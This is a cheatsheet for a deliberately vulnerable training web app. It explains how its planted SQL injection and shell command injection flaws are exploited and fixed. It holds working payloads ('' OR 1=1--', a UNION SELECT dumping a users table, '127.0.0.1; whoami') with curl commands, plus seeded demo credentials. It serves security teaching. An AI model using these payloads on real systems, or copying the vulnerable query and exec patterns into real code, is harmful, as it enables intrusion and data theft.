# Galactic Bestiary — Instructor / Student Cheatsheet

**For authorized security education only.** Run this app locally in a VM or isolated lab. Do not deploy to the public internet.

This document describes how the **intentional** flaws in this project can be exercised. Use it to teach impact, detection, and remediation—not to attack systems you do not own.

---

## Lab map

| Surface | UI location | HTTP | Vulnerable code |
|---------|-------------|------|-----------------|
| SQL injection | **Search portal** | `GET /api/search?q=…` | String-built `LIKE` in [`app/api/search/route.ts`](app/api/search/route.ts) |
| Command injection | **Check planet connectivity** (sidebar) | `POST /api/ping` JSON `{ "target": "…" }` | `exec(\`ping -c 4 ${target}\`)` in [`app/api/ping/route.ts`](app/api/ping/route.ts) |
| Safe baseline | Creature grid / chart | `GET /api/creatures` | Parameterized query in [`app/api/creatures/route.ts`](app/api/creatures/route.ts) |

**Database file:** `data/galactic.db` (SQLite)

**Tables:**

- `creatures` — `id`, `name`, `species`, `danger_level`, `home_planet`, `description`
- `users` — `id`, `username`, `password` (MD5 hex), `clearance_level`

---

## 1. SQL injection (`/api/search`)

### How the flaw works

User input `q` is interpolated **inside** the `prepare()` call:

```typescript
db.prepare(`SELECT * FROM creatures WHERE name LIKE '%${q}%'`)
```

There is **no** parameterization and **no** escaping. Anything you type in the search box (or send as `q`) becomes part of the SQL string.

On failure, the API returns `{ "rows": [], "sqlError": "<message>" }`. The UI shows **sqlError** under the search bar—useful for blind/error-based teaching.

### Reconnaissance (benign)

1. Normal search: `Vorash` → one creature.
2. Wildcard: `%` → all creatures (matches everything in `LIKE`).
3. Trigger a syntax error: `'` → observe `sqlError` in the UI or JSON.

**curl example:**

```bash
curl -s "http://localhost:3000/api/search?q=Vorash" | jq
curl -s "http://localhost:3000/api/search?q=%25" | jq   # %25 = encoded %
curl -s "http://localhost:3000/api/search?q=%27" | jq     # %27 = encoded '
```

### Boolean / tautology (return all creatures)

Close the string and add a always-true condition. SQLite treats `--` as a line comment.

**Payload (search box or `q`):**

```text
' OR 1=1--
```

**Resulting SQL (conceptually):**

```sql
SELECT * FROM creatures WHERE name LIKE '%' OR 1=1--%'
```

The `--` comments out the trailing `%'` so the predicate becomes “match all rows.”

**Variants to try:**

```text
' OR '1'='1'--
%' OR 1=1--
```

### UNION-based extraction (`users` table)

`creatures` has **6** columns. A `UNION SELECT` must supply six expressions.

**Payload:**

```text
' UNION SELECT id, username, password, danger_level, clearance_level, '' FROM users--
```

(`danger_level` is numeric in schema; usernames/passwords appear in `name` / `species` / `clearance_level` fields in the JSON/UI—map columns creatively in class.)

**Cleaner column alignment** (cast numeric id, empty description):

```text
' UNION SELECT id, username, password, 0, clearance_level, 'leaked' FROM users--
```

**curl:**

```bash
curl -s --get "http://localhost:3000/api/search" \
  --data-urlencode "q=' UNION SELECT id, username, password, 0, clearance_level, 'leaked' FROM users--" | jq
```

Students should see rows such as `agent_kane` with MD5 `password` hashes. Cross-reference plaintext hints in [README.md](README.md) (e.g. `nebula-agent` → `9999d3f3a0d39a3d80ca3fe21c455678`).

### Stacked queries / destructive payloads

**Do not run in shared labs without explicit permission.** SQLite + `better-sqlite3` may reject or ignore stacked statements depending on API usage; still worth discussing why production apps must never allow multi-statement input.

Teaching point: even read-only-looking search boxes can become data exfiltration or integrity breaks when SQL is concatenated.

### Remediation talking points

- Use **parameterized queries**: `db.prepare('SELECT * FROM creatures WHERE name LIKE ?').all(\`%${q}%\`)` with bound `q`, or build `%` wildcards in application code only.
- Principle of **least privilege** on DB accounts.
- Never expose raw `sqlError` to end users in production.

---

## 2. Command injection (`/api/ping`)

### How the flaw works

The server runs:

```typescript
exec(`ping -c 4 ${host}`, ...)
```

(`host` comes from JSON `target` via `runRelayPing()`.) `child_process.exec` invokes a shell (`/bin/sh -c …` on Unix). Metacharacters in `target` can chain arbitrary commands.

Output is returned as JSON `{ stdout, stderr, error }` and rendered in **Raw terminal stream** in the sidebar.

### Reconnaissance (benign)

```bash
curl -s -X POST http://localhost:3000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target":"127.0.0.1"}' | jq
```

You should see normal `ping` statistics in `stdout`.

### Command chaining (Unix / macOS lab)

| Technique | Example `target` | Effect |
|-----------|------------------|--------|
| Semicolon | `127.0.0.1; whoami` | Run `whoami` after ping |
| AND | `127.0.0.1 && id` | Second command if first succeeds |
| Pipe | `127.0.0.1 \| uname -a` | Pipe ping output (noisy); often use `;` instead |
| Subshell | `$(whoami)` | Inject via command substitution |
| Newline | `127.0.0.1` + newline + `id` | Second line interpreted by shell |

**UI:** enter in the planet connectivity field, click **Run relay ping**.

**curl examples:**

```bash
# List project directory (adjust path for your machine)
curl -s -X POST http://localhost:3000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target":"127.0.0.1; ls -la"}' | jq -r '.stdout, .stderr'

curl -s -X POST http://localhost:3000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target":"127.0.0.1; pwd"}' | jq

curl -s -X POST http://localhost:3000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target":"127.0.0.1 && whoami"}' | jq
```

Discuss why `ping` output and injected command output may appear together in `stdout`.

### Windows labs

Default code uses `ping -c 4` (Linux/macOS). On Windows, change the route to `ping -n 4` or payloads like `127.0.0.1 & dir` may differ. Injection **still** applies whenever input is passed to `exec` with string concatenation.

### Remediation talking points

- Use `execFile` / `spawn` with an **argument array** and a fixed binary: `spawn('ping', ['-c', '4', validatedHost])`.
- **Allowlist** hostnames/IPs (still validate format).
- Never pass user input through a shell; avoid `exec` with interpolated strings.
- Run services as **non-root** with minimal filesystem access.

---

## 3. What is *not* vulnerable here

- **`GET /api/creatures`** — prepared statement, safe listing for the grid/chart.
- **Frontend** — React escaping reduces XSS from reflected search results; focus the lab on **server-side** SQL and OS command issues.
- **Authentication** — there is no login flow; `users` data is reachable via SQLi only.

---

## 4. Suggested lab flow (45–60 min)

1. **Explore** the UI; confirm 9 seeded creatures and quadrant chart.
2. **SQLi** — `%` → all; `' OR 1=1--` → all; discuss `sqlError` on malformed input.
3. **SQLi exfil** — `UNION SELECT` from `users`; crack or look up MD5 from README.
4. **Command injection** — `127.0.0.1; whoami` then `127.0.0.1; ls -la` (or `pwd`).
5. **Debrief** — show fixed one-liners (parameterized SQL, `spawn` without shell).
6. **Reset** — delete `data/galactic.db` and restart `npm run dev` between classes if needed.

---

## 5. Quick reference payloads

### SQLi (paste into Search portal)

```text
%
' OR 1=1--
' UNION SELECT id, username, password, 0, clearance_level, 'leaked' FROM users--
```

### Command injection (paste into Planet connectivity)

```text
127.0.0.1; whoami
127.0.0.1; ls -la
127.0.0.1 && pwd
```

---

## 6. Opengrep / SAST

Vulnerable code uses **textbook sinks** (inline template literals):

- SQL: `db.prepare(\`SELECT ... '${q}'\`)` in [`app/api/search/route.ts`](app/api/search/route.ts)
- Shell: `exec(\`ping -c 4 ${host}\`)` in [`app/api/ping/route.ts`](app/api/ping/route.ts)

**Scan results (typical):**

| Command | Lab API findings |
|---------|------------------|
| `npm run scan:security` (`.opengrep/galactic-lab.yaml`) | **3–4** (SQLi + CMDi) |
| `npm run scan:community` (cloned semgrep-rules subset) | **0** (Express/Lambda/mysql sinks) |
| `opengrep scan --config auto app/api/` | **0** (registry rules still miss Next.js + `better-sqlite3`) |

Students should use **custom lab rules** plus manual review; cloned community packs remain a **false-negative** demo.

```bash
npm run scan:security
npm run scan:community
npm run scan:all
```

See [README.md](README.md) § Static analysis.

---

## 7. Seeded credentials (post-exfiltration)

After UNION, students can verify MD5 hashes:

| username | password (plaintext) | MD5 (stored) |
|----------|----------------------|--------------|
| agent_kane | nebula-agent | 9999d3f3a0d39a3d80ca3fe21c455678 |
| dr_vex | void-walker | de4b2dfe7295596b4f6dca84d781418a |
| cmd_tess | stellar-ops | d17e5f43b86e142a4c4ecd80903a9cf7 |
| analyst_rio | deep-core | d2832fa0e6986721e038d8e2dfb4f421 |
| xenon_7 | xenon-clear | 17ea4c9547edb80f4d2b63b686aa991d |

Teaching note: MD5 for passwords is **weak storage**; pair with discussion of bcrypt/Argon2 and salting.
